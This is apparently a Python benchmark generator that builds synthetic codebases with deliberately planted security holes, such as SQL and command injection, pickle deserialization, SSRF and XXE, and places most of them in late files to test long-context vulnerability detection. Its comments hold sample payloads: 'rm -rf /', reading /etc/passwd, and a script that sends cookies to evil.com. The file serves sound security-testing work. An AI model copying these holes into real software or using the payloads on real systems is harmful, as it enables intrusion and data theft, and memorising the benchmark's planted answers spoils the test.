"""
Scalable Synthetic Codebase Generator

Generates a realistic Python codebase with:
- Configurable size (target token count)
- Intentional vulnerabilities DISTRIBUTED EVENLY throughout
- CRITICAL vulnerabilities placed in the LAST 20% of files (where truncated LLM won't see)
- Cross-file dependencies and attack paths
- Auto-cleanup via temp directory
"""

import random
from pathlib import Path
from typing import Optional
import tempfile


# =============================================================================
# VULNERABILITY TEMPLATES - Each is a distinct, detectable security issue
# =============================================================================

VULNS = {
    "SQL_INJECTION": '''
def query_{entity}_by_id(user_input: str):
    """Query {entity} by user-provided ID. CRITICAL VULNERABILITY: SQL Injection."""
    # SECURITY ISSUE: Direct string interpolation in SQL query
    # Attacker can inject: ' OR '1'='1' --
    query = f"SELECT * FROM {table} WHERE id = '{{user_input}}'"
    connection = get_database_connection()
    cursor = connection.cursor()
    cursor.execute(query)  # Vulnerable to SQL injection!
    return cursor.fetchall()
''',

    "COMMAND_INJECTION": '''
def execute_{action}_command(user_input: str):
    """Execute {action} command. CRITICAL VULNERABILITY: Command Injection."""
    import subprocess
    import os
    # SECURITY ISSUE: User input passed directly to shell
    # Attacker can inject: ; rm -rf / or | cat /etc/passwd
    command = f"{action}_processor.sh {{user_input}}"
    result = subprocess.run(command, shell=True, capture_output=True)  # Command injection!
    return result.stdout.decode()
''',

    "HARDCODED_SECRET": '''
# CRITICAL VULNERABILITY: Hardcoded production credentials
# These should be loaded from environment variables or secret manager
AWS_ACCESS_KEY = "AKIA{aws_key}"
AWS_SECRET_KEY = "wJalrXUtnFEMI/K7MDENG/{aws_secret}"
DATABASE_PASSWORD = "{db_password}"
JWT_SECRET_KEY = "{jwt_secret}"
STRIPE_SECRET_KEY = "sk_live_{stripe_key}"
''',

    "WEAK_CRYPTO": '''
def hash_user_password(password: str) -> str:
    """Hash password for storage. CRITICAL VULNERABILITY: Weak cryptography."""
    import hashlib
    # SECURITY ISSUE: MD5 is cryptographically broken for passwords
    # Should use bcrypt, scrypt, or argon2 with proper salt
    return hashlib.md5(password.encode()).hexdigest()

def encrypt_sensitive_data(data: str, key: str) -> bytes:
    """Encrypt data. VULNERABILITY: Weak encryption."""
    # SECURITY ISSUE: DES is obsolete and easily cracked
    from Crypto.Cipher import DES
    cipher = DES.new(key[:8].encode(), DES.MODE_ECB)  # Weak DES + ECB mode!
    return cipher.encrypt(data.ljust(8).encode())
''',

    "PATH_TRAVERSAL": '''
def read_user_file(filename: str) -> str:
    """Read file uploaded by user. CRITICAL VULNERABILITY: Path traversal."""
    import os
    # SECURITY ISSUE: No path sanitization
    # Attacker can use: ../../../etc/passwd or ..\\..\\..\\windows\\system32\\config\\sam
    base_path = "/var/uploads"
    file_path = os.path.join(base_path, filename)  # Path traversal vulnerability!
    with open(file_path, "r") as f:
        return f.read()

def download_attachment(attachment_id: str) -> bytes:
    """Download attachment. VULNERABILITY: Directory traversal."""
    # SECURITY ISSUE: User-controlled path component
    path = f"/attachments/{{attachment_id}}"  # Traversal via attachment_id!
    with open(path, "rb") as f:
        return f.read()
''',

    "INSECURE_DESERIALIZE": '''
def load_session_data(serialized_data: bytes):
    """Load user session. CRITICAL VULNERABILITY: Insecure deserialization."""
    import pickle
    # SECURITY ISSUE: Pickle can execute arbitrary code during deserialization
    # Attacker can craft malicious pickle payload to get RCE
    return pickle.loads(serialized_data)  # Remote code execution vulnerability!

def restore_user_preferences(data: str):
    """Restore preferences. VULNERABILITY: Unsafe YAML loading."""
    import yaml
    # SECURITY ISSUE: yaml.load with Loader=None allows code execution
    return yaml.load(data)  # Can execute arbitrary Python!
''',

    "SSRF": '''
def fetch_remote_resource(url: str) -> str:
    """Fetch remote resource. CRITICAL VULNERABILITY: SSRF."""
    import requests
    # SECURITY ISSUE: No URL validation allows SSRF attacks
    # Attacker can access: http://169.254.169.254/latest/meta-data/ (AWS metadata)
    # Or internal services: http://localhost:6379/ (Redis), http://internal-api/admin
    response = requests.get(url)  # Server-Side Request Forgery!
    return response.text

def proxy_image(image_url: str) -> bytes:
    """Proxy image for caching. VULNERABILITY: SSRF via image URL."""
    import urllib.request
    # No validation of URL scheme or destination
    return urllib.request.urlopen(image_url).read()  # SSRF vulnerability!
''',

    "XSS": '''
def render_user_comment(comment: str) -> str:
    """Render user comment. CRITICAL VULNERABILITY: XSS."""
    # SECURITY ISSUE: User input rendered without escaping
    # Attacker can inject: <script>document.location='http://evil.com/?c='+document.cookie</script>
    return f"<div class='comment'>{{comment}}</div>"  # Stored XSS vulnerability!

def build_error_page(error_message: str) -> str:
    """Build error page. VULNERABILITY: Reflected XSS."""
    # User-controlled error message not sanitized
    html = f"<html><body><h1>Error: {{error_message}}</h1></body></html>"
    return html  # Reflected XSS!
''',

    "IDOR": '''
def get_user_document(user_id: str, document_id: str):
    """Get user document. CRITICAL VULNERABILITY: IDOR."""
    # SECURITY ISSUE: No authorization check that user owns the document
    # Attacker can access any document by guessing/iterating document_id
    document = database.query(f"SELECT * FROM documents WHERE id = {{document_id}}")
    return document  # Insecure Direct Object Reference!

def update_account_settings(account_id: str, settings: dict):
    """Update account. VULNERABILITY: Broken access control."""
    # No verification that current user owns this account
    database.update("accounts", account_id, settings)  # IDOR vulnerability!
''',

    "XXE": '''
def parse_xml_config(xml_data: str):
    """Parse XML configuration. CRITICAL VULNERABILITY: XXE."""
    from lxml import etree
    # SECURITY ISSUE: External entities enabled allows file disclosure/SSRF
    # Attacker can use: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    parser = etree.XMLParser(resolve_entities=True)  # XXE vulnerability!
    return etree.fromstring(xml_data.encode(), parser)

def import_data_xml(xml_file: str):
    """Import XML data. VULNERABILITY: XML External Entity injection."""
    import xml.etree.ElementTree as ET
    # Default parser may be vulnerable depending on Python version
    tree = ET.parse(xml_file)  # Potential XXE!
    return tree.getroot()
''',

    "MASS_ASSIGNMENT": '''
def update_user_profile(user_id: str, request_data: dict):
    """Update user profile. CRITICAL VULNERABILITY: Mass assignment."""
    # SECURITY ISSUE: All request fields passed directly to update
    # Attacker can add: {"is_admin": true, "role": "superuser"}
    user = User.query.get(user_id)
    for key, value in request_data.items():
        setattr(user, key, value)  # Mass assignment vulnerability!
    user.save()
    return user

def create_account(data: dict):
    """Create account. VULNERABILITY: Unrestricted parameter binding."""
    # No whitelist of allowed fields
    account = Account(**data)  # Can set any field including admin flags!
    database.add(account)
    return account
''',

    "BROKEN_AUTH": '''
def verify_password_reset_token(token: str) -> bool:
    """Verify reset token. CRITICAL VULNERABILITY: Broken authentication."""
    # SECURITY ISSUE: Token not properly validated
    # Just checks if token exists, not if it's expired or used
    if token and len(token) > 10:
        return True  # Broken authentication logic!
    return False

def login_user(username: str, password: str):
    """Login user. VULNERABILITY: Timing attack susceptible."""
    user = get_user(username)
    if user and user.password == password:  # Not using constant-time comparison!
        return create_session(user)
    return None
''',
}

# Cross-file vulnerability chains
CROSS_FILE_ATTACK_PATH = '''
"""
{module_name} - Cross-file attack chain component.

This module demonstrates a multi-file vulnerability chain where tainted
data flows through multiple modules without proper sanitization.
"""

from {source_module} import {source_func}
from {sink_module} import {sink_func}

def process_{entity}_flow(user_input: str):
    """
    CROSS-FILE VULNERABILITY CHAIN:

    Attack path:
    1. User input enters via {source_module}.{source_func}
    2. Data flows to this module without sanitization
    3. Tainted data passed to {sink_module}.{sink_func}
    4. Vulnerability triggered in sink function

    This demonstrates why analyzing files in isolation misses critical issues.
    """
    # Step 1: Get data from potentially vulnerable source
    raw_data = {source_func}(user_input)

    # Step 2: No sanitization or validation
    processed_data = raw_data  # Tainted data!

    # Step 3: Pass to vulnerable sink
    result = {sink_func}(processed_data)  # Cross-file vulnerability chain!

    return result
'''


# =============================================================================
# FILLER CODE TEMPLATES
# =============================================================================

FILLER_FUNCTION = '''
def {name}_{index}({params}) -> {return_type}:
    """
    {docstring}

    This function handles {purpose} for the application.
    It processes input data and returns the computed result.

    Args:
        {args_doc}

    Returns:
        {return_type}: The processed result

    Raises:
        ValueError: If input is invalid
        RuntimeError: If processing fails

    Example:
        >>> result = {name}_{index}({example_args})
        >>> print(result)
    """
    # Validate input parameters
    if not {validation}:
        raise ValueError("Invalid input parameters")

    # Initialize result container
    result = {init_value}

    # Process the data
    for item in {iterator}:
        # Apply transformation
        transformed = item
        {processing_steps}
        result = transformed

    # Return final result
    return result
'''


# =============================================================================
# GENERATOR CLASS
# =============================================================================

class CodebaseGenerator:
    """
    Generates synthetic Python codebases with evenly distributed vulnerabilities.

    KEY FEATURE: Places CRITICAL vulnerabilities in the LAST 20% of files,
    which will be truncated by normal LLMs but fully analyzed by ContextShard.
    """

    def __init__(
        self,
        target_tokens: int = 150000,
        num_modules: int = 8,
        vulns_in_early_files: int = 4,
        vulns_in_late_files: int = 8,  # More vulns in late files!
    ):
        self.target_tokens = target_tokens
        self.num_modules = num_modules
        self.vulns_in_early_files = vulns_in_early_files
        self.vulns_in_late_files = vulns_in_late_files

        # Track generated content
        self.total_tokens = 0
        self.files_created = 0
        self.vulns_planted = []
        self.all_files = []  # Track order for late-file vulnerability injection

        # Module structure - more modules for larger codebase
        self.modules = {
            "api": ["routes", "handlers", "middleware", "serializers"],
            "auth": ["login", "session", "tokens", "permissions"],
            "services": ["user_service", "payment_service", "report_service", "email_service"],
            "data": ["queries", "models", "repositories", "cache"],
            "utils": ["validators", "helpers", "formatters", "parsers"],
            "config": ["settings", "constants", "logging_config", "feature_flags"],
            "workers": ["tasks", "scheduler", "queue", "processors"],
            "integrations": ["external_api", "webhooks", "oauth", "storage"],
        }

        # Vulnerability types to distribute
        self.vuln_types = list(VULNS.keys())

    def estimate_tokens(self, text: str) -> int:
        """Estimate token count (roughly 4 chars per token)."""
        return len(text) // 4

    def generate(self, output_dir: Path) -> dict:
        """Generate the codebase and return metadata."""
        output_dir = Path(output_dir)

        # Create module directories
        for module in self.modules:
            (output_dir / module).mkdir(parents=True, exist_ok=True)

        # Phase 1: Generate base files with some early vulnerabilities
        self._generate_base_files(output_dir)

        # Phase 2: Generate filler files to reach token target
        self._generate_filler_files(output_dir)

        # Phase 3: Inject CRITICAL vulnerabilities into the LAST 20% of files
        self._inject_late_vulnerabilities(output_dir)

        # Phase 4: Add cross-file attack paths
        self._plant_cross_file_vulns(output_dir)

        return {
            "total_tokens": self.total_tokens,
            "files_created": self.files_created,
            "vulnerabilities": self.vulns_planted,
            "path": str(output_dir),
            "early_vulns": self.vulns_in_early_files,
            "late_vulns": len([v for v in self.vulns_planted if "LATE_FILE" in v[0] or "CRITICAL" in v[0]]),
        }

    def _generate_base_files(self, output_dir: Path):
        """Generate base module files with some early vulnerabilities."""
        early_vuln_count = 0
        early_vuln_types = random.sample(self.vuln_types, min(self.vulns_in_early_files, len(self.vuln_types)))

        for module, submodules in self.modules.items():
            for submodule in submodules:
                file_path = output_dir / module / f"{submodule}.py"

                # Add vulnerability to some early files
                vuln_to_add = None
                if early_vuln_count < self.vulns_in_early_files:
                    if early_vuln_types:
                        vuln_to_add = early_vuln_types.pop(0)
                        early_vuln_count += 1

                content = self._generate_file_content(module, submodule, vuln_to_add)
                file_path.write_text(content)

                tokens = self.estimate_tokens(content)
                self.total_tokens += tokens
                self.files_created += 1
                self.all_files.append(file_path)

    def _generate_filler_files(self, output_dir: Path):
        """Generate filler files to reach token target."""
        file_index = 1

        while self.total_tokens < self.target_tokens:
            for module, submodules in self.modules.items():
                for submodule in submodules[:2]:  # First 2 submodules get extras
                    if self.total_tokens >= self.target_tokens:
                        return

                    file_path = output_dir / module / f"{submodule}_{file_index:03d}.py"
                    content = self._generate_filler_content(module, submodule, file_index)

                    file_path.write_text(content)
                    tokens = self.estimate_tokens(content)
                    self.total_tokens += tokens
                    self.files_created += 1
                    self.all_files.append(file_path)

            file_index += 1
            if file_index > 50:  # Safety limit
                break

    def _inject_late_vulnerabilities(self, output_dir: Path):
        """Inject CRITICAL vulnerabilities into the LAST 20% of files."""
        if not self.all_files:
            return

        # Get the last 20% of files
        cutoff_index = int(len(self.all_files) * 0.8)
        late_files = self.all_files[cutoff_index:]

        if not late_files:
            return

        # Select vulnerability types for late files (use the most critical ones)
        critical_vulns = ["SQL_INJECTION", "COMMAND_INJECTION", "SSRF", "INSECURE_DESERIALIZE",
                         "XXE", "BROKEN_AUTH", "HARDCODED_SECRET", "PATH_TRAVERSAL"]

        # Inject vulnerabilities into late files
        vulns_to_inject = critical_vulns[:min(self.vulns_in_late_files, len(late_files))]

        for i, vuln_type in enumerate(vulns_to_inject):
            if i >= len(late_files):
                break

            target_file = late_files[i]

            # Read existing content
            existing_content = target_file.read_text()

            # Generate vulnerability code
            vuln_code = self._format_vulnerability(vuln_type, f"late_{i}")

            # Append vulnerability to file
            new_content = existing_content + "\n\n# === CRITICAL SECURITY CODE ===\n" + vuln_code
            target_file.write_text(new_content)

            # Track the vulnerability
            relative_path = target_file.relative_to(output_dir.parent.parent if output_dir.parent.parent.exists() else output_dir)
            self.vulns_planted.append((f"LATE_FILE_CRITICAL_{vuln_type}", str(target_file.name)))

            # Update token count
            self.total_tokens += self.estimate_tokens(vuln_code)

    def _format_vulnerability(self, vuln_type: str, suffix: str) -> str:
        """Format a vulnerability template with unique identifiers."""
        template = VULNS.get(vuln_type, "")

        # Replace placeholders with realistic values
        replacements = {
            "{entity}": f"record_{suffix}",
            "{table}": f"records_{suffix}",
            "{action}": f"process_{suffix}",
            "{aws_key}": "EXAMPLEKEY12345678",
            "{aws_secret}": "ExampleSecretKey1234567890",
            "{db_password}": f"SuperSecret_{suffix}!",
            "{jwt_secret}": f"jwt_key_{suffix}_12345",
            "{stripe_key}": f"AbCdEfGhIjKlMnOp_{suffix}",
        }

        result = template
        for key, value in replacements.items():
            result = result.replace(key, value)

        return result

    def _generate_file_content(self, module: str, submodule: str, vuln_type: Optional[str] = None) -> str:
        """Generate content for a specific file."""
        lines = [
            f'"""',
            f'{submodule.replace("_", " ").title()} module for {module}.',
            f'',
            f'This module provides functionality for handling {submodule} operations.',
            f'"""',
            f'',
            f'from typing import Any, Dict, List, Optional',
            f'import logging',
            f'',
            f'logger = logging.getLogger(__name__)',
            f'',
        ]

        # Add vulnerability if specified
        if vuln_type:
            vuln_code = self._format_vulnerability(vuln_type, submodule)
            lines.append(vuln_code)
            self.vulns_planted.append((vuln_type, f"{module}/{submodule}.py"))

        # Add regular functions
        for i in range(5):
            func_name = f"{submodule}_{random.choice(['process', 'handle', 'validate', 'transform', 'compute'])}_{i}"
            lines.append(self._generate_function(func_name))

        # Add a class
        class_name = f"{submodule.title().replace('_', '')}Manager"
        lines.append(self._generate_class(class_name))

        return '\n'.join(lines)

    def _generate_filler_content(self, module: str, submodule: str, index: int) -> str:
        """Generate filler content to reach token target."""
        lines = [
            f'"""',
            f'{submodule.replace("_", " ").title()} extension module {index}.',
            f'',
            f'Additional functionality for {submodule} operations.',
            f'"""',
            f'',
            f'from typing import Any, Dict, List, Optional, Union, Callable',
            f'from dataclasses import dataclass, field',
            f'import logging',
            f'import json',
            f'import asyncio',
            f'',
            f'logger = logging.getLogger(__name__)',
            f'',
        ]

        # Generate multiple functions with detailed docstrings
        for i in range(10):
            lines.append(FILLER_FUNCTION.format(
                name=f"{submodule}_{random.choice(['fetch', 'update', 'delete', 'create', 'sync'])}",
                index=f"{index}_{i}",
                params="data: Dict[str, Any], options: Optional[Dict] = None",
                return_type="Dict[str, Any]",
                docstring=f"Handle {submodule} operation variant {index}.{i}",
                args_doc=f"data: Input data dictionary\n        options: Optional configuration",
                purpose=f"{submodule} processing",
                example_args="{'key': 'value'}",
                validation="data",
                init_value="{}",
                iterator="data.items()",
                processing_steps=f"""
        # Step 1: Validate item
        if not item:
            continue

        # Step 2: Transform
        key, value = item
        processed_value = str(value).upper() if isinstance(value, str) else value

        # Step 3: Accumulate
        result[key] = processed_value
""",
            ))

        return '\n'.join(lines)

    def _generate_function(self, name: str) -> str:
        """Generate a realistic function."""
        return f'''
def {name}(data: Dict[str, Any], context: Optional[Dict] = None) -> Dict[str, Any]:
    """
    Process {name.replace('_', ' ')} operation.

    Args:
        data: Input data to process
        context: Optional context information

    Returns:
        Processed result dictionary
    """
    logger.info(f"Processing {name} with data: {{data}}")

    if context is None:
        context = {{}}

    result = {{
        "status": "success",
        "data": data,
        "context": context,
    }}

    return result
'''

    def _generate_class(self, name: str) -> str:
        """Generate a realistic class."""
        return f'''
class {name}:
    """
    Manager class for {name.replace('Manager', '').lower()} operations.

    Handles lifecycle and state management.
    """

    def __init__(self, config: Optional[Dict] = None):
        """Initialize {name}."""
        self.config = config or {{}}
        self._cache = {{}}
        self._initialized = False

    def initialize(self) -> bool:
        """Initialize the manager."""
        if self._initialized:
            return True
        self._initialized = True
        logger.info(f"{name} initialized")
        return True

    def process(self, data: Any) -> Any:
        """Process data through the manager."""
        if not self._initialized:
            self.initialize()
        return data

    def cleanup(self) -> None:
        """Clean up resources."""
        self._cache.clear()
        self._initialized = False
'''

    def _plant_cross_file_vulns(self, output_dir: Path):
        """Plant vulnerabilities that span multiple files."""
        # Create cross-file attack path files in the late portion of the codebase
        attack_chains = [
            {
                "name": "user_data_flow",
                "source_module": "api.routes",
                "source_func": "get_user_input",
                "sink_module": "data.queries",
                "sink_func": "execute_raw_query",
                "entity": "user_data",
            },
            {
                "name": "payment_flow",
                "source_module": "api.handlers",
                "source_func": "get_payment_data",
                "sink_module": "integrations.external_api",
                "sink_func": "send_to_processor",
                "entity": "payment",
            },
        ]

        for chain in attack_chains:
            attack_path_file = output_dir / "services" / f"{chain['name']}_chain.py"
            content = CROSS_FILE_ATTACK_PATH.format(
                module_name=chain["name"],
                source_module=chain["source_module"],
                source_func=chain["source_func"],
                sink_module=chain["sink_module"],
                sink_func=chain["sink_func"],
                entity=chain["entity"],
            )
            attack_path_file.write_text(content)
            self.vulns_planted.append((f"CROSS_FILE_{chain['name'].upper()}", f"services/{chain['name']}_chain.py"))
            self.files_created += 1
            self.total_tokens += self.estimate_tokens(content)


def generate_codebase(
    target_tokens: int = 150000,
    num_modules: int = 8,
    vulns_in_early_files: int = 4,
    vulns_in_late_files: int = 8,
    output_dir: Optional[Path] = None,
) -> tuple[Path, dict]:
    """
    Generate a synthetic codebase.

    Args:
        target_tokens: Target token count (default exceeds DeepSeek's 128k context)
        num_modules: Number of top-level modules
        vulns_in_early_files: Vulnerabilities in first 80% of files
        vulns_in_late_files: CRITICAL vulnerabilities in last 20% of files
        output_dir: Output directory (None = create temp dir)

    Returns:
        Tuple of (codebase_path, metadata_dict)
    """
    if output_dir is None:
        output_dir = Path(tempfile.mkdtemp(prefix="contextshard_bench_"))

    generator = CodebaseGenerator(
        target_tokens=target_tokens,
        num_modules=num_modules,
        vulns_in_early_files=vulns_in_early_files,
        vulns_in_late_files=vulns_in_late_files,
    )

    metadata = generator.generate(output_dir)

    return output_dir, metadata


if __name__ == "__main__":
    import sys

    target = int(sys.argv[1]) if len(sys.argv) > 1 else 150000

    print(f"Generating codebase with ~{target:,} tokens...")
    print(f"  - Early vulnerabilities: 4 (in first 80% of files)")
    print(f"  - Late vulnerabilities: 8 (in last 20% of files - truncated by normal LLM!)")

    path, meta = generate_codebase(target_tokens=target)

    print(f"\nGenerated codebase:")
    print(f"  Path: {path}")
    print(f"  Files: {meta['files_created']}")
    print(f"  Tokens: {meta['total_tokens']:,}")
    print(f"  Total vulnerabilities: {len(meta['vulnerabilities'])}")
    print(f"  Early vulnerabilities: {meta['early_vulns']}")
    print(f"  Late vulnerabilities: {meta['late_vulns']}")

    print(f"\nVulnerabilities planted:")
    for vuln_type, location in meta['vulnerabilities']:
        marker = " [LATE - MISSED BY TRUNCATION]" if "LATE_FILE" in vuln_type else ""
        print(f"    - {vuln_type}: {location}{marker}")
